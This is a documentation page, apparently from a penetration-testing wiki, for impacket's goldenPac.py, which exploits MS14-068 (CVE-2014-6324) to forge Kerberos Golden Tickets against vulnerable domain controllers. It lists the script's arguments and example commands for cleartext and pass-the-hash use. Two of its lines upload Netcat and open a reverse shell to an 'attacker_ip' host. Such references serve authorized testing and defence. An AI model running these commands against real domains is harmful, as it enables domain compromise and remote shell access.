# goldenPac.py

[goldenPac.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/goldenPac.py) is an exploitation script for the [CVE-2014-6324](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets#ms14-068-cve-2014-6324) ([MS14-068](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068)). If the domain controller is vulnerable, it is possible to forge a [Golden Ticket](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets#ms14-068-cve-2014-6324) without knowing the `krbtgt` hash by bypassing the PAC signature verification.

Because it is a Kerberos attack, the remote target and the domain MUST be specified with the FQDN and the attacker machine MUST be time synced with the domain controller.

## Commons

It has the following generic command line arguments, similar to many other tools:

* required positional argument #1: `[[domain/]username[:password]@]<targetName>` (e.g. `domain.local/user@dc01.domain.local`).

![required positional argument format](<../../.gitbook/assets/impacket\_positional\_arg-with target.png>)

* `-hashes`: the LM and/or NT hash to use for a [pass-the-hash](https://www.thehacker.recipes/ad/movement/ntlm/pth) (NTLM). The format is as follows: `[LMhash]:NThash` (the LM hash is optional, the NT hash must be prepended with a colon (`:`).
* `-dc-ip`: IP address of the domain controller. If omitted, the positional argument's domain part will be used (in that case, it must be a Fully-Qualified-Domain-Name (FQDN)).
* `-debug`: with this flag set, the utility will be more verbose and will possibly print useful information for debug purposes. With this flag set, the utility will also print tracebacks.
* `-ts`: with this flag set, the utility will prepend all output with a timestamp.

## Specificities

It also has the following specific command line arguments:

* positional argument #2: command to execute on the target system (e.g. `whoami` or `'powershell -c "nc.exe attacker_ip listener_port -e cmd.exe"'`), or arguments for the uploaded file if the `-c` option is used. If omitted, `cmd.exe` will be executed via `psexec` to open a shell. If `None` is specified, no command will be executed and only the TGT will be saved for later use.
* `-target-ip`: IP address of the target machine. If omitted, the positional argument's target part will be used. This argument is useful when NetBIOS name resolution request fail.
* `-c`: uploads the specified file on the remote target and executes it with the arguments passed in the positional argument #2.
* `-w`: writes the Golden Ticket at the specified path. Useful with `None` specified in the positional argument #2.

```bash
# with cleartext credentials
goldenPac.py 'DOMAIN.LOCAL'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

# pass-the-hash (with an NT hash)
goldenPac.py -hashes :'NThash' 'DOMAIN.LOCAL'/'USER'@'DOMAIN_CONTROLLER'

# uploads Netcat and execute a reverse shell
goldenPac.py -c ./nc.exe 'DOMAIN.LOCAL'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER' 'attacker_ip listener_port -e cmd.exe'
```

{% hint style="info" %}
If the -hashes argument is supplied, the utility will be able to use it for [pass-the-hash](https://www.thehacker.recipes/ad/movement/ntlm/pth) when obtaining the Forest SID, when listing Domain Controllers, or use it for [overpass-the-hash](https://www.thehacker.recipes/ad/movement/kerberos/opth) for Kerberos operations.
{% endhint %}

{% hint style="info" %}
The utility creates a PAC with the following default groups ids: 513, 512, 520, 518, 519.

There are scenarios where a ticket with a PAC containing these ids wouldn't be enough (see. [this](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets#practice)). Also, it could be useful to note that as of November 2021 updates, if the username supplied doesn't exist in Active Directory, the ticket will get rejected.
{% endhint %}
